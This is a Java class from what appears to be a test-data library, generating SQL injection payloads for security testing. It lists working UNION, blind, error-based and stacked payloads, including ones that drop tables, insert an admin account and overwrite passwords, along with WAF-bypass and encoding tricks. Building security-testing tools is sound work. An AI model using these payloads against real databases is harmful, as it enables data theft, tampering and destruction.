package com.dataforge.generators.internal;

import com.dataforge.core.DataForgeContext;
import com.dataforge.generators.spi.DataGenerator;
import com.dataforge.model.FieldConfig;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * SQL注入测试生成器
 *
 * <p>生成各种SQL注入测试payload，用于安全测试、渗透测试等场景。
 *
 * <p>支持的参数：
 *
 * <ul>
 *   <li>attack_type: 攻击类型 (UNION|BOOLEAN|TIME|ERROR|BLIND|STACKED) 默认: UNION
 *   <li>db_type: 数据库类型 (MYSQL|POSTGRESQL|ORACLE|MSSQL|SQLITE|GENERIC) 默认: MYSQL
 *   <li>complexity: 复杂度 (SIMPLE|MEDIUM|COMPLEX) 默认: MEDIUM
 *   <li>encoding: 编码方式 (NONE|URL|HEX|UNICODE) 默认: NONE
 *   <li>bypass_waf: 是否绕过WAF 默认: false
 * </ul>
 *
 * @author DataForge Team
 * @since 1.0.0
 */
public class SqlInjectionGenerator extends BaseGenerator
    implements DataGenerator<String, FieldConfig> {

  private static final Logger logger = LoggerFactory.getLogger(SqlInjectionGenerator.class);
  private static final SecureRandom random = new SecureRandom();

  // UNION注入payload
  private static final List<String> UNION_PAYLOADS =
      Arrays.asList(
          "' UNION SELECT 1,2,3--",
          "' UNION SELECT NULL,NULL,NULL--",
          "' UNION ALL SELECT 1,2,3--",
          "1' UNION SELECT user(),version(),database()--",
          "' UNION SELECT table_name FROM information_schema.tables--");

  // 布尔盲注payload
  private static final List<String> BOOLEAN_PAYLOADS =
      Arrays.asList(
          "' AND 1=1--",
          "' AND 1=2--",
          "' AND (SELECT COUNT(*) FROM users)>0--",
          "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
          "' AND LENGTH(database())>5--");

  // 时间盲注payload
  private static final List<String> TIME_PAYLOADS =
      Arrays.asList(
          "'; WAITFOR DELAY '00:00:05'--",
          "' AND SLEEP(5)--",
          "'; SELECT pg_sleep(5)--",
          "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY"
              + " CONCAT(MID((SELECT version()),1,50),FLOOR(RAND(0)*2))) AND SLEEP(5)--");

  // 报错注入payload
  private static final List<String> ERROR_PAYLOADS =
      Arrays.asList(
          "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
          "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
          "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM"
              + " information_schema.tables GROUP BY x)a)--",
          "' UNION SELECT 1,2,3 FROM dual WHERE 1=CTXSYS.DRITHSX.SN(user,(CHR(39)))--");

  // 堆叠注入payload
  private static final List<String> STACKED_PAYLOADS =
      Arrays.asList(
          "'; DROP TABLE users--",
          "'; INSERT INTO users VALUES(1,'admin','password')--",
          "'; UPDATE users SET password='hacked' WHERE id=1--",
          "'; CREATE TABLE temp(id INT)--");

  // WAF绕过技巧
  private static final List<String> WAF_BYPASS_TECHNIQUES =
      Arrays.asList(
          "/**/",
          "/*!*/",
          "+",
          "%20",
          "%09",
          "%0a",
          "%0b",
          "%0c",
          "%0d",
          "UNION/**/SELECT",
          "UN/**/ION",
          "UNI/**/ON",
          "/**/AND/**/",
          "AND/**/",
          "OR/**/",
          "SELECT/**/",
          "FROM/**/");

  @Override
  public String getType() {
    return "sql_injection";
  }

  @Override
  public Class<FieldConfig> getConfigClass() {
    return FieldConfig.class;
  }

  @Override
  public String generate(FieldConfig config, DataForgeContext context) {
    try {
      String attackType = getStringParam(config, "attack_type", "UNION").toUpperCase();
      String dbType = getStringParam(config, "db_type", "MYSQL").toUpperCase();
      String complexity = getStringParam(config, "complexity", "MEDIUM").toUpperCase();
      String encoding = getStringParam(config, "encoding", "NONE").toUpperCase();
      boolean bypassWaf = getBooleanParam(config, "bypass_waf", false);

      String payload = generatePayload(attackType, dbType, complexity);

      if (bypassWaf) {
        payload = applyWafBypass(payload);
      }

      payload = applyEncoding(payload, encoding);

      // 存储到上下文
      context.put("sql_injection_type", attackType);
      context.put("sql_injection_db", dbType);
      context.put("sql_injection_payload", payload);

      return payload;

    } catch (Exception e) {
      logger.error("Failed to generate SQL injection payload", e);
      return "' OR 1=1--";
    }
  }

  private String generatePayload(String attackType, String dbType, String complexity) {
    List<String> payloads;

    switch (attackType) {
      case "UNION":
        payloads = UNION_PAYLOADS;
        break;
      case "BOOLEAN":
        payloads = BOOLEAN_PAYLOADS;
        break;
      case "TIME":
        payloads = adaptTimePayloadsForDb(dbType);
        break;
      case "ERROR":
        payloads = adaptErrorPayloadsForDb(dbType);
        break;
      case "STACKED":
        payloads = STACKED_PAYLOADS;
        break;
      case "BLIND":
        payloads = random.nextBoolean() ? BOOLEAN_PAYLOADS : TIME_PAYLOADS;
        break;
      default:
        payloads = UNION_PAYLOADS;
        break;
    }

    String basePayload = payloads.get(random.nextInt(payloads.size()));

    return enhancePayloadComplexity(basePayload, complexity, dbType);
  }

  private List<String> adaptTimePayloadsForDb(String dbType) {
    switch (dbType) {
      case "MYSQL":
        return Arrays.asList(
            "' AND SLEEP(5)--", "' AND (SELECT SLEEP(5))--", "' AND BENCHMARK(5000000,MD5(1))--");
      case "POSTGRESQL":
        return Arrays.asList("'; SELECT pg_sleep(5)--", "' AND (SELECT pg_sleep(5))--");
      case "MSSQL":
        return Arrays.asList(
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3,"
                + " sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7,"
                + " sysusers AS sys8)--");
      case "ORACLE":
        return Arrays.asList(
            "' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4,"
                + " all_users t5)>0--",
            "' AND DBMS_LOCK.SLEEP(5) IS NULL--");
      default:
        return TIME_PAYLOADS;
    }
  }

  private List<String> adaptErrorPayloadsForDb(String dbType) {
    switch (dbType) {
      case "MYSQL":
        return Arrays.asList(
            "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--");
      case "POSTGRESQL":
        return Arrays.asList(
            "' AND CAST((SELECT version()) AS int)--",
            "' AND (SELECT CAST(COUNT(*) AS varchar) FROM information_schema.tables)::int--");
      case "MSSQL":
        return Arrays.asList(
            "' AND CONVERT(int,(SELECT @@version))--", "' AND CAST((SELECT @@version) AS int)--");
      case "ORACLE":
        return Arrays.asList(
            "' AND CTXSYS.DRITHSX.SN(user,(CHR(39)))--",
            "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM"
                + " dual) IS NULL--");
      default:
        return ERROR_PAYLOADS;
    }
  }

  private String enhancePayloadComplexity(String basePayload, String complexity, String dbType) {
    switch (complexity) {
      case "SIMPLE":
        return basePayload;
      case "COMPLEX":
        return addComplexFeatures(basePayload, dbType);
      case "MEDIUM":
      default:
        return addMediumFeatures(basePayload);
    }
  }

  private String addMediumFeatures(String payload) {
    // 添加中等复杂度特性
    if (random.nextBoolean()) {
      payload = payload.replace("SELECT", "SeLeCt");
    }
    if (random.nextBoolean()) {
      payload = payload.replace(" ", "/**/");
    }
    return payload;
  }

  private String addComplexFeatures(String payload, String dbType) {
    // 添加高复杂度特性
    payload = addMediumFeatures(payload);

    // 添加子查询
    if (payload.contains("SELECT") && random.nextBoolean()) {
      payload = payload.replace("SELECT", "SELECT (SELECT 1) AS dummy,");
    }

    // 添加条件判断
    if (random.nextBoolean()) {
      payload = payload.replace("--", " AND 1=1--");
    }

    return payload;
  }

  private String applyWafBypass(String payload) {
    String technique = WAF_BYPASS_TECHNIQUES.get(random.nextInt(WAF_BYPASS_TECHNIQUES.size()));

    // 应用绕过技巧
    if (technique.contains("/**/")) {
      payload = payload.replace(" ", technique);
    } else if (technique.startsWith("%")) {
      payload = payload.replace(" ", technique);
    } else {
      payload = payload.replace("UNION", technique);
    }

    return payload;
  }

  private String applyEncoding(String payload, String encoding) {
    switch (encoding) {
      case "URL":
        return urlEncode(payload);
      case "HEX":
        return hexEncode(payload);
      case "UNICODE":
        return unicodeEncode(payload);
      case "NONE":
      default:
        return payload;
    }
  }

  private String urlEncode(String payload) {
    return payload
        .replace(" ", "%20")
        .replace("'", "%27")
        .replace("\"", "%22")
        .replace("=", "%3D")
        .replace("(", "%28")
        .replace(")", "%29")
        .replace("-", "%2D");
  }

  private String hexEncode(String payload) {
    StringBuilder hex = new StringBuilder("0x");
    for (char c : payload.toCharArray()) {
      hex.append(String.format("%02x", (int) c));
    }
    return hex.toString();
  }

  private String unicodeEncode(String payload) {
    StringBuilder unicode = new StringBuilder();
    for (char c : payload.toCharArray()) {
      if (c > 127) {
        unicode.append(String.format("\\u%04x", (int) c));
      } else {
        unicode.append(c);
      }
    }
    return unicode.toString();
  }
}
